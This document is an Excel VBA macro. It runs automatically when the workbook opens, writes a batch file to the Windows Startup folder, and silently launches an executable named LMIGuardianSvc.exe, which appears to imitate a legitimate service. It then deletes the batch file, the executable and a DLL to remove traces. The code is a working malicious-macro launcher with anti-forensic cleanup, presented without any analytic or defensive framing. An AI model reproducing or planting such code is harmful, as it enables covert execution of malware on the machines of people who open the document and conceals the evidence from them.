Private Sub Workbook_Open()
    If ThisWorkbook.Sheets("Sheet1").Range("A100").Value <> "Default" Then
        CreateBatchFile
        ThisWorkbook.Sheets("Sheet1").Range("A100").Value = "Default"
        ThisWorkbook.Save
    End If
End Sub

Sub CreateBatchFile()
    Dim Path As String
    Dim objFSO As Object
    Dim BatchFilePath As String
    Dim ExeFilePath As String
    Dim objFile As Object
    Dim objShell As Object
    
    Path = CreateObject("WScript.Shell").SpecialFolders("Startup")
    
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    BatchFilePath = Path & "\test.bat"
    ExeFilePath = ThisWorkbook.Path & "\LMIGuardianSvc.exe"
    DllFilePath = ThisWorkbook.Path & "\LMIGuardianDll.dll"
    BatRunPath = ThisWorkbook.Path & "\run_excel.bat"
    Set objFile = objFSO.CreateTextFile(BatchFilePath, True)
    objFile.Write "start """" """ & ExeFilePath & """" & vbCrLf
    objFile.Close
    
    ' Delay for a short time
    Wait1Second
    
    If objFSO.FileExists(BatchFilePath) Then
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run """" & BatchFilePath & """", 0, False
        
        ' Wait for the batch file to finish executing
        Wait1Second
        
        ' Delete the batch file
        objFSO.DeleteFile BatchFilePath
    Else
        MsgBox "Batch file not found: " & BatchFilePath
    End If
    
    Wait1Second
    Wait1Second
    Wait1Second
    Wait1Second
    Wait1Second
    Wait1Second
    Wait1Second
    
    If objFSO.FileExists(DllFilePath) Then
        objFSO.DeleteFile DllFilePath
    End If
    
    If objFSO.FileExists(ExeFilePath) Then
        objFSO.DeleteFile ExeFilePath
    End If
    
    ' If objFSO.FileExists(BatRunPath) Then
        ' objFSO.DeleteFile BatRunPath
    ' End If
    
    Set objFSO = Nothing
    Set objFile = Nothing
    Set objShell = Nothing
End Sub

Sub Wait1Second()
    Dim endTime As Date
    endTime = DateAdd("s", 1, Now)
    Do While Now < endTime
    DoEvents
    Loop
End Sub

